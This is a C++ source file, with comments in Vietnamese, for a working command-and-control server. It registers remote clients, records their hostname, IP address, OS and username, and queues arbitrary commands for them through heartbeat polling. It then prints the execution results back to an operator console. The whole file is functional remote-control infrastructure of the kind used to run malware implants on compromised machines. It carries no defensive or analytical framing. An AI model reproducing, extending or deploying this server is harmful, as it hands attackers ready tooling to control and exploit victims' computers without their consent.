#include "httplib.h"
#include "iostream"
#include "map"
#include "mutex"
#include "nlohmann/json.hpp"
#include "regex"
#include "string"

using namespace std;
using json = nlohmann::json;

struct ClientInfo {
  string clientId;
  string computerNme;
  string ipAdress;
  string os;
  string username;
  time_t lastSeen;
};

class ServerC2 {
 private:
  httplib::Server srv;
  map<string, ClientInfo> clients;  // Danh sách clients
  mutex clientsMutex;
  map<string, vector<string>> pendingCommands;  // hàng đợi lệnh của từng
                                                // clients

 public:
  void setup() {
    // endpoint đăng ký thông tin client
    srv.Post(
        "/register", [&](const httplib::Request &req, httplib::Response &res) {
          ClientInfo cli;
          json j = json::parse(req.body);
          ClientInfo cInfo{j["client_id"], j["computer_name"], j["ip_address"],
                           j["os"],        j["username"],      time(nullptr)};

          lock_guard<mutex> lock(clientsMutex);
          clients[cInfo.clientId] = cInfo;
          pendingCommands[cInfo.clientId] = vector<string>();

          cout << "[NOT] new client reigsted " << j.dump() << "\n";
        });

    // endpoint xác nhận vẫn còn hoạt động
    srv.Post(
        "/heartbeat", [&](const httplib::Request &req, httplib::Response &res) {
          string cid = json::parse(req.body)["client_id"];
          lock_guard<mutex> lock(clientsMutex);
          clients[cid].lastSeen = time(nullptr);

          //   cout << "[NOT] heartbeat from " << cid << '\n';

          json response;
          if (pendingCommands.count(cid) && !pendingCommands[cid].empty()) {
            response["commands"] = pendingCommands[cid];
            pendingCommands[cid].clear();
          } else {
            response["commands"] = json::array();
          }
          res.set_content(response.dump(), "application/json");
        });

    // endpoint trả kết quả thực thi lệnh
    srv.Post(
        "/result", [&](const httplib::Request &req, httplib::Response &res) {
          json clientResult = json::parse(req.body);
          cout << "[NOT] result from " << clientResult["client_id"] << '\n';
          cout << "[||] commands: " << clientResult["commands"] << '\n';
          cout << "[||] result: "
               << regex_replace(clientResult["result"].get<string>(),
                                regex("\\n"), string("\n"))
               << '\n';
        });
  }

  bool start() { return srv.listen("0.0.0.0", 8888); }

  void stop() { srv.stop(); }

  void sendCommandToClient(const string &clientId, const string &command) {
    if (pendingCommands.count(clientId)) {
      lock_guard<mutex> lock(clientsMutex);
      pendingCommands[clientId].push_back(command);
    }
  }

  void listClient() {
    lock_guard<mutex> lock(clientsMutex);
    cout << "Client List:\n";
    for (const auto &[id, info] : clients) {
      // Nếu client online (lastSeen < 35s), màu xanh lá; offline thì màu đỏ
      time_t now = time(nullptr);
      bool online = (now - info.lastSeen) < 35;
      string color = online ? "\033[32m" : "\033[31m";
      string reset = "\033[0m";
      cout << color << "ID: " << info.clientId
           << " | Name: " << info.computerNme << " | IP: " << info.ipAdress
           << " | OS: " << info.os << " | User: " << info.username
           << " | LastSeen: " << (now - info.lastSeen) << "s ago"
           << " | Status: " << (online ? "ONLINE" : "OFFLINE") << reset << '\n';
    }
  }
};

int main() {
  ServerC2 serv2;
  serv2.setup();
  // Chạy server trên luồng riêng
  thread serverThread([&serv2] { serv2.start(); });

  cout << "C2 server started. Type 'exit' to quit.\n";
  string cmd;

  // Menu chính
  while (true) {
    cout << "> ";
    getline(cin, cmd);
    if (cmd == "exit") break;
    if (cmd.rfind("send ", 0) == 0) {
      size_t firstSpace = cmd.find(' ', 5);
      if (firstSpace != string::npos) {
        string clientId = cmd.substr(5, firstSpace - 5);
        string command = cmd.substr(firstSpace + 1);
        serv2.sendCommandToClient(clientId, command);
        cout << "Command sent to client " << clientId << endl;
      } else {
        cout << "Usage: send <client_id> <command>\n";
      }
    }

    if (cmd == "list") {
      serv2.listClient();
    }

    if (cmd == "help") {
      cout << "Available commands:\n";
      cout << "  send <client_id> <command>  - Send command to client\n";
      cout << "  list                        - List all clients\n";
      cout << "  help                        - Show this help message\n";
      cout << "  exit                        - Quit the server\n";
    }
  }

  serv2.stop();
  serverThread.join();
  return 1;
}